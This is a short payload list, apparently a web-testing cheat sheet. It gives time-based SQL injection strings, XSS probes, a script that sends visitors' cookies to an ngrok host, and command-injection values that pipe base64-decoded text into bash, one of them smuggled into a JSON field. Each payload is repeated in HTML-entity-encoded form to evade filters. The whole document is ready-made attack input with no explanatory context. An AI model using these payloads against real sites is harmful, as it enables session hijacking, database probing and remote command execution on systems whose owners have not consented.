```
Normal:
';select sleep(5)-- -
") or "1"="1--
" or sleep(5)=1--

';alert('xss');//
<svg/onload=confirm(1)>
<script>new Image().src = "<http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=>" + document.cookie;</script>

{
"target":"\";echo cGluZyAtYzIgMTAuMTMuNC4y | base64 -d | bash; \""
}
&&`sleep 10`#
;echo cGluZyAtYzIgMTAuMTMuNC4y|base64 -d|bash;


html entities encoded:

';select sl&#101;ep(5)-- -
") or "&#49; &#61; "&#49;--
" or sl&#101;ep(5)=1--

';alert(&#39;xss&#39;);//
&lt;svg/onload=&#39;confirm(1)&#39;&gt;
&lt;script&gt;new Image().src &#61; &quot;<http://5.tcp.eu.ngrok.io:15257/cool.jpg?output=&quot;> &#43; document.cookie;&lt;/script&gt;

{
&quot;target&quot;:&quot;&quot;;echo cGluZyAtYzIgMTAuMTMuNC4y &#124; base64 -d &#124; bash; &quot;&quot;
}
&#38;&#38;`sl&#101;ep 10`#
;echo cGluZyAtYzIgMTAuMTMuNC4y&#124;base64 -d&#124;bash;
```